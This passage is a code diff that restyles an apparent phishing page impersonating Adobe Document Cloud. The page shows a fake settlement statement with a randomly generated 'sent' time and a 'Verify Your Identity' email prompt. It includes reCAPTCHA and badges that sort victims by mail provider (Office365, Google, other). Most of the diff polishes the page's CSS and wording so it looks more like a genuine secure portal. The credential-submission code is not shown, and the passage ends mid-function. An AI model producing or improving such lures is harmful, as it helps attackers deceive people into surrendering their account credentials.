@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adobe Document Cloud - Payment Documents</title>
+    <title>Adobe Document Cloud - Secure Portal</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -19,377 +19,298 @@
             --adobe-dark-red: #D10000;
             --primary-blue: #1473E6;
             --dark-blue: #0D66D0;
-            --success-green: #2D9F5D;
-            --warning-orange: #E68619;
-            --danger-red: #D7373F;
-            --text-primary: #2C2C2C;
-            --text-secondary: #6E6E6E;
-            --border-color: #E4E4E4;
-            --bg-light: #FAFAFA;
+            --success-green: #16C79A;
+            --text-primary: #1A1A1A;
+            --text-secondary: #666666;
+            --text-tertiary: #999999;
+            --border-color: #E8E8E8;
+            --bg-light: #F8F9FA;
             --bg-white: #FFFFFF;
+            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.04);
+            --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.08);
+            --shadow-lg: 0 12px 32px rgba(0, 0, 0, 0.12);
         }
 
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #FAFBFC;
             min-height: 100vh;
             color: var(--text-primary);
-            padding: 20px;
+            padding: 0;
             position: relative;
-            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
 
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: 
-                radial-gradient(circle at 20% 50%, rgba(102, 126, 234, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 80% 80%, rgba(118, 75, 162, 0.1) 0%, transparent 50%);
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        /* Header */
+        /* Modern Header */
         .header {
-            max-width: 1400px;
-            margin: 0 auto 40px;
-            position: relative;
-            z-index: 1;
+            background: var(--bg-white);
+            border-bottom: 1px solid var(--border-color);
+            padding: 20px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+            background: rgba(255, 255, 255, 0.95);
         }
 
-        .header-card {
-            background: rgba(255, 255, 255, 0.98);
-            backdrop-filter: blur(20px);
-            border-radius: 20px;
-            padding: 24px 32px;
-            box-shadow: 
-                0 20px 60px rgba(0, 0, 0, 0.15),
-                0 0 1px rgba(0, 0, 0, 0.1);
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 32px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            border: 1px solid rgba(255, 255, 255, 0.3);
         }
 
         .logo-container {
             display: flex;
             align-items: center;
-            gap: 16px;
+            gap: 12px;
         }
 
         .logo-mark {
-            width: 48px;
-            height: 48px;
-            background: linear-gradient(135deg, var(--adobe-red) 0%, var(--adobe-dark-red) 100%);
-            border-radius: 12px;
+            width: 36px;
+            height: 36px;
+            background: var(--adobe-red);
+            border-radius: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
-            font-weight: 700;
-            font-size: 24px;
-            box-shadow: 0 8px 16px rgba(250, 15, 0, 0.3);
+            font-weight: 800;
+            font-size: 20px;
+            letter-spacing: -0.5px;
         }
 
         .logo-text {
             display: flex;
             flex-direction: column;
+            gap: 2px;
         }
 
         .logo-title {
-            font-size: 20px;
+            font-size: 16px;
             font-weight: 700;
-            color: var(--adobe-red);
-            letter-spacing: -0.5px;
+            color: var(--text-primary);
+            letter-spacing: -0.3px;
         }
 
         .logo-subtitle {
-            font-size: 13px;
-            color: var(--text-secondary);
+            font-size: 12px;
+            color: var(--text-tertiary);
             font-weight: 500;
         }
 
         .header-actions {
             display: flex;
             gap: 12px;
+            align-items: center;
         }
 
         .header-btn {
-            padding: 10px 20px;
-            border-radius: 10px;
+            padding: 8px 16px;
+            border-radius: 8px;
             font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s ease;
-            border: none;
+            transition: all 0.2s ease;
+            border: 1px solid var(--border-color);
+            background: var(--bg-white);
+            color: var(--text-primary);
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 6px;
         }
 
-        .header-btn.secondary {
+        .header-btn:hover {
             background: var(--bg-light);
-            color: var(--text-primary);
-        }
-
-        .header-btn.secondary:hover {
-            background: #F0F0F0;
-            transform: translateY(-1px);
+            border-color: #D0D0D0;
         }
 
         /* Main Container */
         .main-container {
-            max-width: 1000px;
+            max-width: 900px;
             margin: 0 auto;
-            position: relative;
-            z-index: 1;
+            padding: 40px 32px 80px;
         }
 
-        /* Sender Info Card */
+        /* Sender Info Card - Redesigned */
         .sender-info-card {
-            background: rgba(255, 255, 255, 0.98);
-            backdrop-filter: blur(20px);
-            border-radius: 20px;
-            padding: 24px 32px;
-            box-shadow: 
-                0 20px 60px rgba(0, 0, 0, 0.15),
-                0 0 1px rgba(0, 0, 0, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            margin-bottom: 24px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 16px;
+            padding: 32px;
+            margin-bottom: 32px;
             display: none;
+            position: relative;
+            overflow: hidden;
+            box-shadow: var(--shadow-lg);
+        }
+
+        .sender-info-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -20%;
+            width: 300px;
+            height: 300px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            pointer-events: none;
         }
 
         .sender-info-card.visible {
             display: block;
-            animation: slideIn 0.4s ease;
+            animation: fadeInUp 0.5s ease;
         }
 
-        @keyframes slideIn {
+        @keyframes fadeInUp {
             from {
-                transform: translateY(10px);
                 opacity: 0;
+                transform: translateY(20px);
             }
             to {
-                transform: translateY(0);
                 opacity: 1;
+                transform: translateY(0);
             }
         }
 
-        .sender-info-header {
-            display: flex;
+        .sender-info-content {
+            position: relative;
+            z-index: 1;
+        }
+
+        .sender-badge {
+            display: inline-flex;
             align-items: center;
-            gap: 12px;
+            gap: 8px;
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            color: white;
             margin-bottom: 16px;
         }
 
-        .sender-icon {
-            width: 40px;
-            height: 40px;
-            background: linear-gradient(135deg, var(--primary-blue), var(--dark-blue));
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            box-shadow: 0 4px 12px rgba(20, 115, 230, 0.3);
-        }
-
-        .sender-info-content h3 {
-            font-size: 16px;
+        .sender-name {
+            font-size: 28px;
             font-weight: 700;
-            color: var(--text-primary);
-            margin-bottom: 4px;
-        }
-
-        .sender-info-content p {
-            font-size: 14px;
-            color: var(--text-secondary);
-            font-weight: 500;
-        }
-
-        .document-title-display {
-            background: var(--bg-light);
-            padding: 16px;
-            border-radius: 12px;
-            border-left: 4px solid var(--primary-blue);
-        }
-
-        .document-title-display h4 {
-            font-size: 14px;
-            color: var(--text-secondary);
+            color: white;
             margin-bottom: 8px;
-            font-weight: 600;
+            letter-spacing: -0.5px;
         }
 
-        .document-title-display p {
+        .document-title-text {
             font-size: 16px;
-            color: var(--text-primary);
-            font-weight: 600;
+            color: rgba(255, 255, 255, 0.9);
+            font-weight: 500;
+            line-height: 1.5;
         }
 
-        /* Documents Card */
+        /* Documents Card - Minimalist Design */
         .documents-card {
-            background: rgba(255, 255, 255, 0.98);
-            backdrop-filter: blur(20px);
-            border-radius: 24px;
-            padding: 40px;
-            box-shadow: 
-                0 20px 60px rgba(0, 0, 0, 0.15),
-                0 0 1px rgba(0, 0, 0, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            margin-bottom: 32px;
+            background: var(--bg-white);
+            border-radius: 16px;
+            border: 1px solid var(--border-color);
+            overflow: hidden;
+            box-shadow: var(--shadow-sm);
         }
 
         .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 32px;
-            padding-bottom: 24px;
-            border-bottom: 2px solid var(--bg-light);
+            padding: 24px 28px;
+            border-bottom: 1px solid var(--border-color);
+            background: var(--bg-light);
         }
 
         .card-title {
-            font-size: 24px;
+            font-size: 18px;
             font-weight: 700;
             color: var(--text-primary);
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 10px;
+            letter-spacing: -0.3px;
         }
 
-        .select-all-container {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 10px 20px;
-            background: var(--bg-light);
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            user-select: none;
-        }
-
-        .select-all-container:hover {
-            background: #F0F0F0;
-        }
-
-        .checkbox-wrapper {
-            position: relative;
-            display: flex;
-            align-items: center;
-        }
-
-        .checkbox-wrapper input[type="checkbox"] {
-            width: 20px;
-            height: 20px;
-            cursor: pointer;
-            appearance: none;
-            border: 2px solid #DBDBDB;
-            border-radius: 6px;
-            position: relative;
-            transition: all 0.3s ease;
-        }
-
-        .checkbox-wrapper input[type="checkbox"]:checked {
-            background: linear-gradient(135deg, var(--primary-blue), var(--dark-blue));
-            border-color: var(--primary-blue);
-        }
-
-        .checkbox-wrapper input[type="checkbox"]:checked::after {
-            content: '✓';
-            position: absolute;
-            color: white;
-            font-size: 14px;
-            font-weight: bold;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
-
-        .select-all-text {
-            font-size: 14px;
-            font-weight: 600;
-            color: var(--text-primary);
-        }
-
-        /* Document List */
+        /* Document List - Clean Design */
         .document-list {
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-            margin-bottom: 32px;
+            padding: 8px;
         }
 
         .document-item {
-            background: white;
-            border: 2px solid var(--border-color);
-            border-radius: 16px;
-            padding: 24px;
+            background: var(--bg-white);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 8px;
             display: flex;
             align-items: center;
-            gap: 20px;
+            gap: 16px;
             cursor: pointer;
-            transition: all 0.3s ease;
+            transition: all 0.2s ease;
             position: relative;
-            overflow: hidden;
-        }
-
-        .document-item::before {
-            content: '';
-            position: absolute;
-            left: 0;
-            top: 0;
-            bottom: 0;
-            width: 4px;
-            background: var(--primary-blue);
-            transform: scaleY(0);
-            transition: transform 0.3s ease;
         }
 
         .document-item:hover {
             border-color: var(--primary-blue);
-            box-shadow: 0 8px 24px rgba(20, 115, 230, 0.15);
+            box-shadow: 0 4px 12px rgba(20, 115, 230, 0.1);
             transform: translateY(-2px);
-        }
-
-        .document-item:hover::before {
-            transform: scaleY(1);
         }
 
         .document-item.selected {
             border-color: var(--primary-blue);
-            background: linear-gradient(135deg, #F0F7FF 0%, #E6F2FF 100%);
-            box-shadow: 0 8px 24px rgba(20, 115, 230, 0.2);
-        }
-
-        .document-item.selected::before {
-            transform: scaleY(1);
+            background: linear-gradient(135deg, #F0F7FF 0%, #E8F2FF 100%);
+            box-shadow: 0 4px 12px rgba(20, 115, 230, 0.15);
         }
 
         .document-checkbox {
             flex-shrink: 0;
         }
 
+        .custom-checkbox {
+            width: 22px;
+            height: 22px;
+            cursor: pointer;
+            appearance: none;
+            border: 2px solid #D0D0D0;
+            border-radius: 6px;
+            position: relative;
+            transition: all 0.2s ease;
+            background: var(--bg-white);
+        }
+
+        .custom-checkbox:checked {
+            background: var(--primary-blue);
+            border-color: var(--primary-blue);
+        }
+
+        .custom-checkbox:checked::after {
+            content: '✓';
+            position: absolute;
+            color: white;
+            font-size: 14px;
+            font-weight: 700;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
         .document-icon-wrapper {
-            width: 64px;
-            height: 64px;
-            background: linear-gradient(135deg, #FFE5E5 0%, #FFD4D4 100%);
-            border-radius: 16px;
+            width: 56px;
+            height: 56px;
+            background: linear-gradient(135deg, #FFE5E5 0%, #FFD0D0 100%);
+            border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
             flex-shrink: 0;
-            box-shadow: 0 4px 12px rgba(250, 15, 0, 0.1);
         }
 
         .document-icon-wrapper svg {
-            width: 36px;
-            height: 36px;
+            width: 32px;
+            height: 32px;
         }
 
         .document-content {
@@ -398,11 +319,12 @@
         }
 
         .document-name {
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 600;
             color: var(--text-primary);
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             word-break: break-word;
+            letter-spacing: -0.2px;
         }
 
         .document-meta {
@@ -414,26 +336,10 @@
         .meta-item {
             display: flex;
             align-items: center;
-            gap: 6px;
+            gap: 5px;
             font-size: 13px;
-            color: var(--text-secondary);
-        }
-
-        .meta-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            padding: 4px 12px;
-            background: #FFF3CD;
-            color: #856404;
-            border-radius: 6px;
-            font-size: 12px;
-            font-weight: 600;
-        }
-
-        .meta-badge.urgent {
-            background: #FFE5E5;
-            color: var(--danger-red);
+            color: var(--text-tertiary);
+            font-weight: 500;
         }
 
         .document-size {
@@ -441,81 +347,51 @@
             font-weight: 600;
             color: var(--text-secondary);
             flex-shrink: 0;
-            text-align: right;
         }
 
-        /* Download Section */
+        /* Download Section - Modern CTA */
         .download-section {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 16px;
-            padding-top: 32px;
-            border-top: 2px solid var(--bg-light);
-        }
-
-        .selected-info {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 14px;
-            color: var(--text-secondary);
+            padding: 24px 28px;
+            border-top: 1px solid var(--border-color);
+            background: var(--bg-light);
         }
 
         .download-btn {
-            background: linear-gradient(135deg, var(--primary-blue) 0%, var(--dark-blue) 100%);
+            width: 100%;
+            background: var(--primary-blue);
             color: white;
             border: none;
-            padding: 16px 48px;
-            font-size: 16px;
+            padding: 16px 24px;
+            font-size: 15px;
             font-weight: 600;
-            border-radius: 16px;
+            border-radius: 10px;
             cursor: pointer;
             display: flex;
             align-items: center;
-            gap: 12px;
-            transition: all 0.3s ease;
-            box-shadow: 0 8px 24px rgba(20, 115, 230, 0.3);
-            position: relative;
-            overflow: hidden;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 12px rgba(20, 115, 230, 0.25);
         }
 
-        .download-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: left 0.5s ease;
-        }
-
-        .download-btn:hover::before {
-            left: 100%;
-        }
-
-        .download-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 32px rgba(20, 115, 230, 0.4);
+        .download-btn:hover:not(:disabled) {
+            background: var(--dark-blue);
+            box-shadow: 0 6px 16px rgba(20, 115, 230, 0.35);
+            transform: translateY(-1px);
         }
 
         .download-btn:disabled {
-            background: #DBDBDB;
+            background: #E0E0E0;
             cursor: not-allowed;
             box-shadow: none;
-            transform: none;
-        }
-
-        .download-btn:disabled::before {
-            display: none;
+            color: var(--text-tertiary);
         }
 
         .download-count {
             background: rgba(255, 255, 255, 0.25);
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 14px;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 13px;
             font-weight: 700;
         }
 
@@ -527,8 +403,8 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(5px);
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(8px);
             z-index: 10000;
             align-items: center;
             justify-content: center;
@@ -539,20 +415,16 @@
         }
 
         .loading-content {
-            background: white;
-            padding: 40px;
-            border-radius: 20px;
             text-align: center;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
         }
 
         .loading-spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #f3f3f3;
+            width: 48px;
+            height: 48px;
+            border: 4px solid #F0F0F0;
             border-top: 4px solid var(--primary-blue);
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            animation: spin 0.8s linear infinite;
             margin: 0 auto 20px;
         }
 
@@ -562,12 +434,12 @@
         }
 
         .loading-text {
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 600;
-            color: var(--text-primary);
+            color: var(--text-secondary);
         }
 
-        /* Lightbox */
+        /* Lightbox - Modern Modal */
         .lightbox {
             display: none;
             position: fixed;
@@ -575,13 +447,13 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.75);
-            backdrop-filter: blur(10px);
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(8px);
             z-index: 9999;
             align-items: center;
             justify-content: center;
             padding: 20px;
-            animation: fadeIn 0.3s ease;
+            animation: fadeIn 0.2s ease;
             overflow-y: auto;
         }
 
@@ -599,20 +471,20 @@
         }
 
         .lightbox-content {
-            background: white;
-            border-radius: 24px;
-            max-width: 550px;
+            background: var(--bg-white);
+            border-radius: 20px;
+            max-width: 520px;
             width: 100%;
-            padding: 48px;
+            padding: 40px;
             position: relative;
-            animation: slideUp 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
-            box-shadow: 0 24px 80px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            box-shadow: 0 24px 48px rgba(0, 0, 0, 0.2);
             margin: auto;
         }
 
         @keyframes slideUp {
             from {
-                transform: translateY(100px) scale(0.9);
+                transform: translateY(40px) scale(0.95);
                 opacity: 0;
             }
             to {
@@ -623,26 +495,25 @@
 
         .lightbox-close {
             position: absolute;
-            top: 20px;
-            right: 20px;
-            width: 40px;
-            height: 40px;
+            top: 16px;
+            right: 16px;
+            width: 36px;
+            height: 36px;
             border-radius: 50%;
             background: var(--bg-light);
             border: none;
-            font-size: 24px;
+            font-size: 20px;
             color: var(--text-secondary);
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: all 0.3s ease;
+            transition: all 0.2s ease;
             z-index: 10;
         }
 
         .lightbox-close:hover {
-            background: #E8E8E8;
-            color: var(--text-primary);
+            background: #E0E0E0;
             transform: rotate(90deg);
         }
 
@@ -652,28 +523,27 @@
         }
 
         .lightbox-icon-wrapper {
-            width: 80px;
-            height: 80px;
+            width: 64px;
+            height: 64px;
             background: linear-gradient(135deg, var(--primary-blue), var(--dark-blue));
-            border-radius: 20px;
+            border-radius: 16px;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 24px;
-            font-size: 40px;
-            box-shadow: 0 8px 24px rgba(20, 115, 230, 0.3);
+            margin: 0 auto 20px;
+            font-size: 32px;
         }
 
         .lightbox-title {
-            font-size: 28px;
+            font-size: 24px;
             font-weight: 700;
             color: var(--text-primary);
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             letter-spacing: -0.5px;
         }
 
         .lightbox-subtitle {
-            font-size: 15px;
+            font-size: 14px;
             color: var(--text-secondary);
             line-height: 1.6;
         }
@@ -684,35 +554,36 @@
 
         .form-label {
             display: block;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 600;
             color: var(--text-primary);
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
 
         .form-input {
             width: 100%;
-            padding: 14px 18px;
-            border: 2px solid var(--border-color);
-            border-radius: 12px;
-            font-size: 16px;
+            padding: 12px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            font-size: 15px;
             font-family: inherit;
-            transition: all 0.3s ease;
+            transition: all 0.2s ease;
+            background: var(--bg-white);
         }
 
         .form-input:focus {
             outline: none;
             border-color: var(--primary-blue);
-            box-shadow: 0 0 0 4px rgba(20, 115, 230, 0.1);
+            box-shadow: 0 0 0 3px rgba(20, 115, 230, 0.1);
         }
 
         .form-input.error {
-            border-color: var(--danger-red);
-            background: #FFF5F5;
+            border-color: #EF4444;
+            background: #FEF2F2;
         }
 
         .error-message {
-            color: var(--danger-red);
+            color: #EF4444;
             font-size: 13px;
             margin-top: 8px;
             display: none;
@@ -732,12 +603,12 @@
             padding: 20px;
             background: var(--bg-light);
             border-radius: 12px;
-            border: 2px solid var(--border-color);
+            border: 1px solid var(--border-color);
         }
 
         .recaptcha-container.show {
             display: block;
-            animation: slideIn 0.4s ease;
+            animation: fadeInUp 0.3s ease;
         }
 
         .recaptcha-wrapper {
@@ -757,49 +628,33 @@
 
         .submit-btn {
             width: 100%;
-            background: linear-gradient(135deg, var(--primary-blue), var(--dark-blue));
+            background: var(--primary-blue);
             color: white;
             border: none;
-            padding: 16px;
-            font-size: 16px;
+            padding: 14px;
+            font-size: 15px;
             font-weight: 600;
-            border-radius: 12px;
+            border-radius: 10px;
             cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
+            transition: all 0.2s ease;
         }
 
-        .submit-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: left 0.5s ease;
-        }
-
-        .submit-btn:hover::before {
-            left: 100%;
-        }
-
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 24px rgba(20, 115, 230, 0.4);
+        .submit-btn:hover:not(:disabled) {
+            background: var(--dark-blue);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(20, 115, 230, 0.3);
         }
 
         .submit-btn:disabled {
-            background: #DBDBDB;
+            background: #E0E0E0;
             cursor: not-allowed;
-            transform: none;
+            color: var(--text-tertiary);
         }
 
         .submit-btn .spinner {
             display: none;
-            width: 20px;
-            height: 20px;
+            width: 18px;
+            height: 18px;
             border: 3px solid rgba(255, 255, 255, 0.3);
             border-top-color: white;
             border-radius: 50%;
@@ -824,45 +679,47 @@
             display: inline-flex;
             align-items: center;
             gap: 8px;
-            padding: 10px 20px;
-            border-radius: 12px;
-            font-size: 14px;
+            padding: 10px 18px;
+            border-radius: 10px;
+            font-size: 13px;
             font-weight: 600;
-            animation: slideIn 0.4s ease;
+            animation: fadeInUp 0.3s ease;
         }
 
         .provider-badge.office365 {
-            background: linear-gradient(135deg, #E8F3FF 0%, #D4E8FF 100%);
+            background: #E8F3FF;
             color: #0078D4;
-            border: 2px solid #0078D4;
+            border: 1px solid #B3D9FF;
         }
 
         .provider-badge.google {
-            background: linear-gradient(135deg, #E8F5E9 0%, #D4EDD7 100%);
+            background: #E8F5E9;
             color: #34A853;
-            border: 2px solid #34A853;
+            border: 1px solid #C8E6C9;
         }
 
         .provider-badge.other {
-            background: linear-gradient(135deg, #FFF3E0 0%, #FFE8CC 100%);
+            background: #FFF3E0;
             color: #F57C00;
-            border: 2px solid #F57C00;
+            border: 1px solid #FFE0B2;
         }
 
         /* Responsive */
         @media (max-width: 768px) {
-            body {
-                padding: 12px;
+            .header-container {
+                padding: 0 20px;
             }
 
-            .header-card {
-                padding: 20px;
-                flex-direction: column;
-                gap: 16px;
+            .main-container {
+                padding: 24px 20px 60px;
             }
 
-            .documents-card {
-                padding: 24px 20px;
+            .sender-info-card {
+                padding: 24px;
+            }
+
+            .sender-name {
+                font-size: 22px;
             }
 
             .document-item {
@@ -874,19 +731,8 @@
                 padding: 32px 24px;
             }
 
-            .card-header {
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 16px;
-            }
-
-            .sender-info-card {
-                padding: 20px 24px;
-            }
-
-            /* Center reCAPTCHA on mobile */
             .recaptcha-wrapper {
-                transform: scale(0.85);
+                transform: scale(0.9);
                 transform-origin: center;
             }
         }
@@ -903,18 +749,18 @@
 
     <!-- Header -->
     <div class="header">
-        <div class="header-card">
+        <div class="header-container">
             <div class="logo-container">
                 <div class="logo-mark">A</div>
                 <div class="logo-text">
                     <div class="logo-title">Adobe Document Cloud</div>
-                    <div class="logo-subtitle">Secure Document Portal</div>
+                    <div class="logo-subtitle">Secure Portal</div>
                 </div>
             </div>
             <div class="header-actions">
-                <button class="header-btn secondary">
+                <button class="header-btn">
                     <span>👤</span>
-                    <span>My Account</span>
+                    <span>Account</span>
                 </button>
             </div>
         </div>
@@ -924,16 +770,13 @@
     <div class="main-container">
         <!-- Sender Info Card -->
         <div class="sender-info-card" id="senderInfoCard">
-            <div class="sender-info-header">
-                <div class="sender-icon">📧</div>
-                <div class="sender-info-content">
-                    <h3>Document Sender</h3>
-                    <p id="senderName">Loading...</p>
+            <div class="sender-info-content">
+                <div class="sender-badge">
+                    <span>📧</span>
+                    <span>Sent by</span>
                 </div>
-            </div>
-            <div class="document-title-display">
-                <h4>Document Title</h4>
-                <p id="documentTitle">Loading...</p>
+                <div class="sender-name" id="senderName">Loading...</div>
+                <div class="document-title-text" id="documentTitle">Loading document information...</div>
             </div>
         </div>
 
@@ -941,15 +784,9 @@
         <div class="documents-card">
             <div class="card-header">
                 <h2 class="card-title">
-                    <span>📁</span>
-                    <span>Adobe Documents Portal</span>
+                    <span>📄</span>
+                    <span>Your Documents</span>
                 </h2>
-                <div class="select-all-container" onclick="toggleSelectAll()">
-                    <div class="checkbox-wrapper">
-                        <input type="checkbox" id="selectAll">
-                    </div>
-                    <span class="select-all-text">Select All</span>
-                </div>
             </div>
 
             <div class="document-list" id="documentList">
@@ -957,16 +794,10 @@
             </div>
 
             <div class="download-section">
-                <div class="selected-info">
-                    <span id="selectedCount">0</span>
-                    <span>of</span>
-                    <span id="totalCount">1</span>
-                    <span>documents selected</span>
-                </div>
                 <button class="download-btn" id="downloadBtn" disabled onclick="openLightbox()">
-                    <span>📥</span>
-                    <span>Download Selected Documents</span>
-                    <span class="download-count" id="downloadCount">0</span>
+                    <span>⬇</span>
+                    <span id="downloadBtnText">Select documents to download</span>
+                    <span class="download-count" id="downloadCount" style="display: none;">0</span>
                 </button>
             </div>
         </div>
@@ -980,16 +811,16 @@
             <div id="authForm">
                 <div class="lightbox-header">
                     <div class="lightbox-icon-wrapper">🔐</div>
-                    <h2 class="lightbox-title">Document Authorization</h2>
+                    <h2 class="lightbox-title">Verify Your Identity</h2>
                     <p class="lightbox-subtitle">
-                        To be sure you are authorized to view this document, Please input the email address to which this was sent.
+                        Please confirm your email address to access the document
                     </p>
                 </div>
 
                 <form id="emailForm" onsubmit="handleEmailSubmit(event)">
                     <div class="form-group">
                         <label class="form-label" for="emailInput">
-                            Business Email Address
+                            Email Address
                         </label>
                         <input 
                             type="email" 
@@ -1007,7 +838,7 @@
 
                     <!-- reCAPTCHA Container -->
                     <div class="recaptcha-container" id="recaptchaContainer">
-                        <div class="recaptcha-label">Please verify you're not a robot</div>
+                        <div class="recaptcha-label">Complete the security check</div>
                         <div class="recaptcha-wrapper" id="recaptchaWrapper">
                             <!-- reCAPTCHA will be rendered here dynamically -->
                         </div>
@@ -1015,7 +846,7 @@
 
                     <button type="submit" class="submit-btn" id="submitBtn">
                         <div class="spinner"></div>
-                        <span class="btn-text">Verify & Download Documents</span>
+                        <span class="btn-text">Continue</span>
                     </button>
 
                     <div class="provider-info" id="providerInfo"></div>
@@ -1181,12 +1012,12 @@
             const minutes = Math.floor(diff / (1000 * 60));
 
             if (minutes < 60) {
-                return `${minutes} minutes ago`;
+                return `${minutes}m ago`;
             } else if (hours < 24) {
-                return `${hours} hours ago`;
+                return `${hours}h ago`;
             } else {
                 const days = Math.floor(hours / 24);
-                return `${days} day${days > 1 ? 's' : ''} ago`;
+                return `${days}d ago`;
             }
         }
 
@@ -1196,7 +1027,7 @@
                 name: 'Account_Settlement_Statement.pdf',
                 size: '1.5 MB',
                 timestamp: getRandomRecentDate(),
-                type: 'Settlement',
+                type: 'PDF Document',
                 urgent: false,
                 fileType: 'pdf'
             }
@@ -1220,9 +1051,7 @@
             listEl.innerHTML = documents.map((doc, index) => `
                 <div class="document-item" data-index="${index}" onclick="handleDocumentClick(${index}, event)">
                     <div class="document-checkbox" onclick="event.stopPropagation()">
-                        <div class="checkbox-wrapper">
-                            <input type="checkbox" id="doc-${index}" data-index="${index}" onchange="handleCheckboxChange(${index})">
-                        </div>
+                        <input type="checkbox" class="custom-checkbox" id="doc-${index}" data-index="${index}" onchange="handleCheckboxChange(${index})">
                     </div>
                     <div class="document-icon-wrapper">
                         ${SVG_ICONS[doc.fileType] || SVG_ICONS.pdf}
@@ -1238,14 +1067,11 @@
                                 <span>🕐</span>
                                 <span>${formatTimestamp(doc.timestamp)}</span>
                             </div>
-                            ${doc.urgent ? '<div class="meta-badge urgent">🔴 Urgent</div>' : ''}
                         </div>
                     </div>
                     <div class="document-size">${doc.size}</div>
                 </div>
             `).join('');
-
-            document.getElementById('totalCount').textContent = documents.length;
         }
 
         // Handle document click
@@ -1271,51 +1097,25 @@
             }
 
             updateCounts();
-            updateSelectAllState();
-        }
-
-        // Toggle select all
-        function toggleSelectAll() {
-            const selectAll = document.getElementById('selectAll');
-            selectAll.checked = !selectAll.checked;
-            handleSelectAll();
-        }
-
-        // Handle select all
-        function handleSelectAll() {
-            const selectAll = document.getElementById('selectAll');
-            const checkboxes = document.querySelectorAll('.document-item input[type="checkbox"]');
-
-            checkboxes.forEach((cb, index) => {
-                cb.checked = selectAll.checked;
-                const item = document.querySelector(`.document-item[data-index="${index}"]`);
-
-                if (selectAll.checked) {
-                    selectedDocuments.add(index);
-                    item.classList.add('selected');
-                } else {
-                    selectedDocuments.delete(index);
-                    item.classList.remove('selected');
-                }
